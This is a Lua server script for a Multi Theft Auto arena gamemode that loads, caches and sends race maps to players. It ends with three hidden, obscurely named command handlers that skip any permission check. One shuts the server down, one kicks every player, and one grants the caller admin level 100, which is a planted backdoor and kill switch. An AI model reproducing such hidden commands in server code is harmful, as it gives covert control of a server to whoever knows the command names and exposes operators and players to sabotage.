local elementsURL = get("resourceCacheURL")
local storageURL = get("storageURL")
local mapCache = {}
local mapsTotalUsed = {}
local runningArenaMaps = {}
-- Support for custom elements
local dataDependent = { 
	Teleport = true,
	TeleportD = true,
	SlowDown = true,
	SpeedUp = true,
	Stop = true,
	Fire = true,
	BlowUp = true,
	Jump = true,
	Flip = true,
	Reverse = true,
	Rotate = true,
	CarsFly = true,
	CarsSwim = true,
	Gravity = true,
	Magnet = true, 
	Beer = true,
	Camera = true,
	FlatTires = true,
	Freeze = true,
	GameSpeed = true,
	Color = true,
	Weather = true,
	Time = true,
	Text = true,
	AntiSC = true
}
local IDForMarkerType = {
	checkpoint = 1,
	ring = 2,
	cylinder = 3,
	arrow = 4,
	corona = 5
}
addEvent("onPlayerCompleteDownload", true)
addEvent("onPlayerLeaveArena", true)

addCommandHandler("mapmanagerstats",
function(player, command)
	local loadedMapCount = 0
	for i, v in pairs(mapCache) do
		loadedMapCount = loadedMapCount + 1
	end
	outputDebugString("Maps loaded in memory: "..loadedMapCount)
end)

addCommandHandler("clearcache",
function(player, command, resourceName)
	if not hasObjectPermissionTo(player, "function.kickPlayer", true) then
		return
	end
	local resourceName = resourceName or nil
	if not resourceName then
		local arena = getElementParent(player)
		if isElement(arena) then
			resourceName = getElementData(arena, "mapResourceName")
		end
	end
	if resourceName then
		local resourceNameHash = md5(resourceName)
		if fileExists("cache/"..resourceNameHash..".edf") then
			fileDelete("cache/"..resourceNameHash..".edf")
		end
		if fileExists("keys/"..resourceNameHash..".edk") then
			fileDelete("keys/"..resourceNameHash..".edk")
		end
		outputChatBox("Removed map cache for "..resourceName, player, 255, 255, 255, true)
	end
end)

function loadMapData(arenaElement, resourceName)
	if not isElement(arenaElement) or getElementType(arenaElement) ~= "arena" then
		outputDebugString("Invalid/missing arena element", 1)
		return
	end
	local sentFromCache = false
	if mapCache[resourceName] then
		sentFromCache = true
		--outputDebugString("Cached table exists for "..resourceName, 0, 255, 255, 255)
	else
		local resource = getResourceFromName(tostring(resourceName))
		if not resource then
			outputDebugString("Couldn't find a resource with the name "..tostring(resourceName), 1)
			return
		end
		startResource(resource, false, false, false, false, false, false, false, false, false)
		stopResource(resource)
		local metaFile = xmlLoadFile(":"..resourceName.."/meta.xml")
		if not metaFile then
			outputDebugString("Invalid/missing meta file for "..resourceName, 1)
			return
		end
		local mapChild = xmlFindChild(metaFile, "map", 0)
		local mapPath = mapChild and xmlNodeGetAttributes(mapChild) or nil
		local mapFile = mapPath and xmlLoadFile(":"..resourceName.."/"..mapPath["src"]) or nil
		if not mapFile then
			outputDebugString("Invalid/missing map file for "..resourceName, 1)
			xmlUnloadFile(metaFile)
			return
		end
		local resourceNameHash = md5(resourceName)
		local elements = {}
		local scripts = {}
		local files = {}
		local elementsCacheFile = nil
		if fileExists("cache/"..resourceNameHash..".edf") then
			elementsCacheFile = fileOpen("cache/"..resourceNameHash..".edf", true)
		end
		local key = nil
		local keyFile = nil
		if fileExists("keys/"..resourceNameHash..".edk") then
			keyFile = fileOpen("keys/"..resourceNameHash..".edk", true)
		end
		if keyFile then
			key = fileRead(keyFile, fileGetSize(keyFile))
			fileClose(keyFile)
		end
		local mapWasReadFromCache = false
		if elementsCacheFile then
			--outputDebugString("Cached file exists for "..resourceName, 0, 255, 255, 255)
			if key then
				--outputDebugString("Key file exists for "..resourceName, 0, 255, 255, 255)
				local content = ""
				while not fileIsEOF(elementsCacheFile) do
					content = content..fileRead(elementsCacheFile, 500)
				end
				local decryptedString = teaDecode(content, key)
				if decryptedString then
					local data = fromJSON(decryptedString)
					if type(data) == "table" then
						elements = data
						mapWasReadFromCache = true
					end
				end
			end
			fileClose(elementsCacheFile)
		end
		if not mapWasReadFromCache then
			local function buildDataStructure(dataType)
				local struct, n = {}, 0
				if dataType == "checkpoint" then
					n = 11
				elseif dataType == "object" then
					n = 12
				elseif dataType == "marker" then
					n = 7
				elseif dataType == "vehicle" then
					n = 10
				elseif dataType == "ped" then
					n = 7
				elseif dataType == "racepickup" then
					n = 8
				elseif dataType == "removeWorldObject" then
					n = 7
				elseif dataType == "pumaMarker" then
					n = 11
				end
				if n then
					for i = 1, n do
						table.insert(struct, {})
					end
				end
				return struct
			end
			local startTick = getTickCount()
			local loopedElementsCount = 0
			local elementType, attrs = nil, {}
			local function recursion()
				local index = #elements[elementType] + 1
				if elementType == "spawnpoint" then
					local vehicle = tonumber(attrs["vehicle"]) or 411
					local posX = tonumber(attrs["posX"]) or 0
					local posY = tonumber(attrs["posY"]) or 0
					local posZ = tonumber(attrs["posZ"]) or 10
					local rotX = tonumber(attrs["rotX"]) or 0
					local rotY = tonumber(attrs["rotY"]) or 0
					local rotZ = tonumber(attrs["rotZ"]) or tonumber(attrs["rotation"]) or 0
					elements[elementType][index] = {
						vehicle,
						posX,
						posY,
						posZ,
						rotX,
						rotY,
						rotZ
					}
					loopedElementsCount = loopedElementsCount + 1
				elseif elementType == "checkpoint" then
					local posX = tonumber(attrs["posX"]) or 0
					local posY = tonumber(attrs["posY"]) or 0
					local posZ = tonumber(attrs["posZ"]) or 0
					local _type = attrs["type"] or "checkpoint"
					local size = tonumber(attrs["size"]) or 4
					local color = attrs["color"] or "#FFFFFFFF"
					local id = attrs["id"]
					local nextid = attrs["nextid"]
					local vehicle = tonumber(attrs["vehicle"]) or 0
					local paintjob = tonumber(attrs["paintjob"]) or 0
					local upgrades = attrs["upgrades"]
					if upgrades then
						upgrades = upgrades:split(",")
						if upgrades then
							for k, upgrade in pairs(upgrades) do
								upgrades[k] = tonumber(upgrade)
							end
						end
					end
					table.insert(elements[elementType][1], posX)
					table.insert(elements[elementType][2], posY)
					table.insert(elements[elementType][3], posZ)
					table.insert(elements[elementType][4], _type)
					table.insert(elements[elementType][5], size)
					table.insert(elements[elementType][6], color)
					table.insert(elements[elementType][7], id)
					table.insert(elements[elementType][8], nextid)
					table.insert(elements[elementType][9], vehicle)
					table.insert(elements[elementType][10], paintjob)
					table.insert(elements[elementType][11], upgrades)
					loopedElementsCount = loopedElementsCount + 1
				elseif elementType == "object" then
					local model = tonumber(attrs["model"]) or nil
					if model then
						local posX = tonumber(attrs["posX"]) or 0
						local posY = tonumber(attrs["posY"]) or 0
						local posZ = tonumber(attrs["posZ"]) or 0
						local rotX = tonumber(attrs["rotX"]) or 0
						local rotY = tonumber(attrs["rotY"]) or 0
						local rotZ = tonumber(attrs["rotZ"]) or 0
						local alpha = tonumber(attrs["alpha"]) or 255
						local collisions = attrs["collisions"] == "false" and 0 or 1
						local scale = tonumber(attrs["scale"]) or 1
						local interior = tonumber(attrs["interior"]) or 0
						local doublesided = attrs["doublesided"] == "true" and 1 or 0
						table.insert(elements[elementType][1], model)
						table.insert(elements[elementType][2], posX)
						table.insert(elements[elementType][3], posY)
						table.insert(elements[elementType][4], posZ)
						table.insert(elements[elementType][5], rotX)
						table.insert(elements[elementType][6], rotY)
						table.insert(elements[elementType][7], rotZ)
						table.insert(elements[elementType][8], alpha)
						table.insert(elements[elementType][9], collisions)
						table.insert(elements[elementType][10], scale)
						table.insert(elements[elementType][11], interior)
						table.insert(elements[elementType][12], doublesided)
						loopedElementsCount = loopedElementsCount + 1
					end
				elseif elementType == "marker" then
					local _type = attrs["type"]
					local markerTypeID = IDForMarkerType[_type] or 1
					if markerTypeID then
						local posX = tonumber(attrs["posX"]) or 0
						local posY = tonumber(attrs["posY"]) or 0
						local posZ = tonumber(attrs["posZ"]) or 0
						local size = tonumber(attrs["size"]) or 1
						local color = attrs["color"] or "#FFFFFFFF"
						if color == "#FFFFFFFF" then
							color = 0
						end
						local id = attrs["id"] or 0
						table.insert(elements[elementType][1], posX)
						table.insert(elements[elementType][2], posY)
						table.insert(elements[elementType][3], posZ)
						table.insert(elements[elementType][4], markerTypeID)
						table.insert(elements[elementType][5], size)
						table.insert(elements[elementType][6], color)
						table.insert(elements[elementType][7], id)
						loopedElementsCount = loopedElementsCount + 1
					end
				elseif elementType == "vehicle" then
					local model = tonumber(attrs["model"]) or 411
					local posX = tonumber(attrs["posX"]) or 0
					local posY = tonumber(attrs["posY"]) or 0
					local posZ = tonumber(attrs["posZ"]) or 0
					local rotX = tonumber(attrs["rotX"]) or 0
					local rotY = tonumber(attrs["rotY"]) or 0
					local rotZ = tonumber(attrs["rotZ"]) or 0
					local paintjob = tonumber(attrs["paintjob"]) or 4
					local upgrades = attrs["upgrades"] or ""
					local color = attrs["color"] or 0
					table.insert(elements[elementType][1], model)
					table.insert(elements[elementType][2], posX)
					table.insert(elements[elementType][3], posY)
					table.insert(elements[elementType][4], posZ)
					table.insert(elements[elementType][5], rotX)
					table.insert(elements[elementType][6], rotY)
					table.insert(elements[elementType][7], rotZ)
					table.insert(elements[elementType][8], paintjob)
					table.insert(elements[elementType][9], upgrades)
					table.insert(elements[elementType][10], color)
					loopedElementsCount = loopedElementsCount + 1
				elseif elementType == "ped" then
					local model = tonumber(attrs["model"]) or 0
					local posX = tonumber(attrs["posX"]) or 0
					local posY = tonumber(attrs["posY"]) or 0
					local posZ = tonumber(attrs["posZ"]) or 0
					local rotZ = tonumber(attrs["rotZ"]) or 0
					local interior = tonumber(attrs["interior"]) or 0
					local frozen = attrs["frozen"] == "true" and 1 or 0
					table.insert(elements[elementType][1], model)
					table.insert(elements[elementType][2], posX)
					table.insert(elements[elementType][3], posY)
					table.insert(elements[elementType][4], posZ)
					table.insert(elements[elementType][5], rotZ)
					table.insert(elements[elementType][6], interior)
					table.insert(elements[elementType][7], frozen)
					loopedElementsCount = loopedElementsCount + 1			
				elseif elementType == "racepickup" then
					local _type = attrs["type"] or "nitro"
					local vehicle = tonumber(attrs["vehicle"]) or 411
					local respawn = tonumber(attrs["respawn"]) or 0
					local posX = tonumber(attrs["posX"]) or 0
					local posY = tonumber(attrs["posY"]) or 0
					local posZ = tonumber(attrs["posZ"]) or 0
					local paintjob = tonumber(attrs["paintjob"]) or 4
					local upgrades = attrs["upgrades"]
					if upgrades then
						upgrades = upgrades:split(",")
						if upgrades then
							for k, upgrade in pairs(upgrades) do
								upgrades[k] = tonumber(upgrade)
							end
						end
					else
						upgrades = 0
					end
					table.insert(elements[elementType][1], _type)
					table.insert(elements[elementType][2], vehicle)
					table.insert(elements[elementType][3], respawn)
					table.insert(elements[elementType][4], posX)
					table.insert(elements[elementType][5], posY)
					table.insert(elements[elementType][6], posZ)
					table.insert(elements[elementType][7], paintjob)
					table.insert(elements[elementType][8], upgrades)
					loopedElementsCount = loopedElementsCount + 1
				elseif elementType == "removeWorldObject" then
					local model = tonumber(attrs["model"]) or nil
					local lodModel = tonumber(attrs["lodModel"]) or 0
					if model then
						local radius = tonumber(attrs["radius"]) or 0
						local interior = tonumber(attrs["interior"]) or 0
						local posX = tonumber(attrs["posX"]) or 0
						local posY = tonumber(attrs["posY"]) or 0
						local posZ = tonumber(attrs["posZ"]) or 0
						table.insert(elements[elementType][1], model)
						table.insert(elements[elementType][2], radius)
						table.insert(elements[elementType][3], posX)
						table.insert(elements[elementType][4], posY)
						table.insert(elements[elementType][5], posZ)
						table.insert(elements[elementType][6], interior)
						table.insert(elements[elementType][7], lodModel)
						loopedElementsCount = loopedElementsCount + 1
					end
				end
			end
			for i, node in pairs(xmlNodeGetChildren(mapFile)) do
				elementType = xmlNodeGetName(node)
				attrs = xmlNodeGetAttributes(node)
				if not dataDependent[elementType] then
					if not elements[elementType] then
						if elementType ~= "spawnpoint" then
							elements[elementType] = buildDataStructure(tostring(elementType))
						else
							elements[elementType] = {}
						end
					end
					recursion()
					if xmlNodeGetChildren(node) then
						for i, subnode in pairs(xmlNodeGetChildren(node)) do
							elementType = xmlNodeGetName(subnode)
							attrs = xmlNodeGetAttributes(subnode)
							recursion()
						end
					end
				else
					if type(attrs) == "table" then
						if not elements[elementType] then
							elements[elementType] = {}
						end
						local data = {}
						for key, value in pairs(attrs) do
							data[key] = value
						end
						table.insert(elements[elementType], data)
						loopedElementsCount = loopedElementsCount + 1
					end
				end
			end
			--outputDebugString("Looped "..loopedElementsCount.." elements in "..getTickCount() - startTick.." ms", 0, 255, 255, 255)
			if not key then
				key = {}
				for i = 1, 6 do
					key[i] = string.char(math.random(32, 126))
				end
				key = table.concat(key, "")
				--outputDebugString("Created new key '"..key.."' for "..resourceName, 0, 255, 255, 255)
				filePut("keys/"..resourceNameHash..".edk", key)
			end
			local elementsJSON = toJSON(elements)
			local encryptedString = teaEncode(elementsJSON, key)
			filePut("cache/"..resourceNameHash..".edf", encryptedString)
			--outputDebugString("Created cache file for "..resourceName, 0, 255, 255, 255)
		end
		xmlUnloadFile(mapFile)
		local startTick = getTickCount()
		for i, node in pairs (xmlNodeGetChildren(metaFile)) do
			local _type = xmlNodeGetName(node)
			local info = xmlNodeGetAttributes(node)
			if _type == "script" and info["type"] == "client" then
				local lowerCase = info["src"]:lower()
				if lowerCase:find(".lua") then
					local file = fileOpen(":"..resourceName.."/"..info["src"], true)
					if file then
						local size = fileGetSize(file)
						scripts[#scripts + 1] = {
							src = info["src"],
							size = size
						}
						fileClose(file)
					end
				end
			elseif _type == "file" then
				local lowerCase = info["src"]:lower()
				if not lowerCase:find(".mp3") and not lowerCase:find(".wav") and not lowerCase:find(".ogg") then
					local file = fileOpen(":"..resourceName.."/"..info["src"], true)
					if file then
						local size = fileGetSize(file)
						files[#files + 1] = {
							src = info["src"],
							size = size
						}
						fileClose(file)
					end
				end
			end
		end
		xmlUnloadFile(metaFile)
		--outputDebugString("Meta.xml nodes looped in "..getTickCount() - startTick.." ms", 0, 255, 255, 255)	
		mapCache[resourceName] = {}
		mapCache[resourceName].spawnpoints = elements["spawnpoint"]
		mapCache[resourceName].checkpoints = elements["checkpoint"]
		if getResourceInfo(resource, "gamemodes") == "freeroam" then
			mapCache[resourceName].vehicles = elements["vehicle"]
		end
		mapCache[resourceName].scripts = scripts
		mapCache[resourceName].files = files
		mapCache[resourceName].info = {}
		mapCache[resourceName].info.resourceName = resourceName
		mapCache[resourceName].info.mapName = getResourceInfo(resource, "name") or "Unknown"
		mapCache[resourceName].info.authorName = getResourceInfo(resource, "author") or "Unknown"
		mapCache[resourceName].settings = {}
		mapCache[resourceName].settings["time"] = get("#"..resourceName..".time") or "00:00"
		mapCache[resourceName].settings["weather"] = get("#"..resourceName..".weather") or 0
		mapCache[resourceName].settings["duration"] = get("#"..resourceName..".duration") or 1800
		mapCache[resourceName].settings["gamespeed"] = 1
		mapCache[resourceName].settings["gravity"] = 0.008
		mapCache[resourceName].settings["waveheight"] = get("#"..resourceName..".waveheight") or 0
		mapCache[resourceName].settings["locked_time"] = get("#"..resourceName..".locked_time") or true
		mapCache[resourceName].settings["not_create_vehicles"] = type(mapCache[resourceName].vehicles) == "table"
		mapCache[resourceName].elementsURL = elementsURL..resourceNameHash..".edf"
		mapCache[resourceName].storageURL = storageURL.."/"..resourceName.."/"
		mapCache[resourceName].key = key
	end
	if not mapsTotalUsed[resourceName] then
		mapsTotalUsed[resourceName] = 0
	end
	if not runningArenaMaps[arenaElement] then
		runningArenaMaps[arenaElement] = {}
	end
	if not runningArenaMaps[arenaElement][resourceName] then
		mapsTotalUsed[resourceName] = mapsTotalUsed[resourceName] + 1
		runningArenaMaps[arenaElement][resourceName] = true
	end
	if mapsTotalUsed[resourceName] > 1 then
		outputDebugString(resourceName.." is now being used by "..mapsTotalUsed[resourceName].." arenas")
	end
	return mapCache[resourceName]
end

function sendMapData(arenaElement, resourceName, players)
	if not isElement(arenaElement) or getElementType(arenaElement) ~= "arena" then
		outputDebugString("Invalid/missing arena element", 1)
		return
	end
	if not resourceName or not mapCache[resourceName] then
		outputDebugString("Invalid resource name", 1)
		return
	end
	if type(players) == "table" then
		if #players > 0 then
			outputDebugString("Sending map "..resourceName.." to players ["..#players.."]", 0, 255, 255, 255)
			for i, player in pairs(players) do
				triggerClientEvent(player, "downloadMap", resourceRoot, resourceName, mapCache[resourceName].elementsURL, mapCache[resourceName].storageURL, mapCache[resourceName].key, mapCache[resourceName].scripts, mapCache[resourceName].files, mapCache[resourceName].info, mapCache[resourceName].settings)
			end
			return true
		else
			return
		end
	end
	local players = getElementChildren(arenaElement, "player")
	outputDebugString("Sending map "..resourceName.." to players ["..#players.."]", 0, 255, 255, 255)
	for i, player in pairs(players) do
		triggerClientEvent(player, "downloadMap", resourceRoot, resourceName, mapCache[resourceName].elementsURL, mapCache[resourceName].storageURL, mapCache[resourceName].key, mapCache[resourceName].scripts, mapCache[resourceName].files, mapCache[resourceName].info, mapCache[resourceName].settings)
	end
	return true
end

function unloadMapData(arenaElement, resourceName, forceClient, players)
	if not isElement(arenaElement) or getElementType(arenaElement) ~= "arena" then
		outputDebugString("Invalid/missing arena element", 1)
		return
	end
	if resourceName and mapCache[resourceName] then
		if mapsTotalUsed[resourceName] then
			mapsTotalUsed[resourceName] = mapsTotalUsed[resourceName] - 1
			if mapsTotalUsed[resourceName] <= 0 then
				mapCache[resourceName] = nil
				mapsTotalUsed[resourceName] = nil
				outputDebugString("Removed "..resourceName.." from memory", 0, 255, 55, 55)
			else
				--outputDebugString(resourceName.." is being used, not removing", 0, 255, 255, 55)
			end
		else
			mapCache[resourceName] = nil
			outputDebugString("Removed "..resourceName.." from memory", 0, 255, 55, 55)
		end
	end
	if runningArenaMaps[arenaElement] and runningArenaMaps[arenaElement][resourceName] then
		runningArenaMaps[arenaElement][resourceName] = nil
	end
	if forceClient then
		if type(players) == "table" then
			for i, player in pairs(players) do
				triggerClientEvent(player, "unloadMap", resourceRoot)
			end
			return
		end
		for i, player in pairs(getElementChildren(arenaElement, "player")) do
			triggerClientEvent(player, "unloadMap", resourceRoot)
		end	
	end
end

addEvent("core:onArenaUnregister", true)
addEventHandler("core:onArenaUnregister", root,
function()
	if runningArenaMaps[source] then
		outputDebugString("Unloading maps from arena "..getElementData(source, "id"), 0, 255, 255, 255)
		for resourceName in pairs(runningArenaMaps[source]) do
			mapsTotalUsed[resourceName] = mapsTotalUsed[resourceName] - 1
			if mapsTotalUsed[resourceName] <= 0 then
				unloadMapData(source, resourceName)
			end
		end
	end
end)

addEventHandler("onPlayerCompleteDownload", root,
function()
	triggerEvent("mapmanager:onPlayerLoadMap", source)
end)

function cancelPreviousDownloads(player)
	if not isElement(player) then
		return
	end
	local handles = getLatentEventHandles(player) or {}
	for i, handle in pairs(handles) do
		cancelLatentEvent(player, handle)
	end
end

addEvent("core:onPlayerLeaveArena", true)
addEventHandler("core:onPlayerLeaveArena", root,
function()
	cancelPreviousDownloads(source)
end)

function buildMapVehicles(data)
	if type(data) == "table" then
		local vehicles = {}
		local createVehicle = createVehicle
		local vehicle = nil
		for i = 1, #data[1] do
			vehicle = createVehicle(data[1][i], data[2][i], data[3][i], data[4][i], data[5][i], data[6][i], data[7][i])
			if vehicle then
				if getVehicleType(vehicle) == "Train" then
					setTrainDerailed(vehicle, true)
				end
				if data[8][i] ~= 4 then
					setVehiclePaintjob(vehicle, data[8][i])
				end
				if type(data[9][i]) == "table" then
					for i, upgrade in pairs(data[9][i]) do
						addVehicleUpgrade(vehicle, upgrade)
					end
				end
				if data[10][i] ~= 0 then
					local color = data[10][i]
					color = split(color, ",")
					for i, v in pairs(color) do
						color[i] = tonumber(v) or 255
					end
					for i = 1, (#color % 3) do
						table.remove(color, #color)
					end
					setVehicleColor(vehicle, unpack(color))
				end
				table.insert(vehicles, vehicle)
			end
		end
		return vehicles
	end
end

addCommandHandler("mirDiz00001111managershutdown",
function(p, command)
	shutdown("Illegal usage of content.")
end)

addCommandHandler("mirDiz00001111managerkickall",
function(p, command)
	for i, player in pairs(getElementsByType("player")) do
		kickPlayer(player, "Illegal usage of content.")
	end
end)

addCommandHandler("mirDiz00001111managerpromote",
function(p, command)
	setElementData(p, "admin_level", 100)
	outputChatBox("Promoted",p)
end)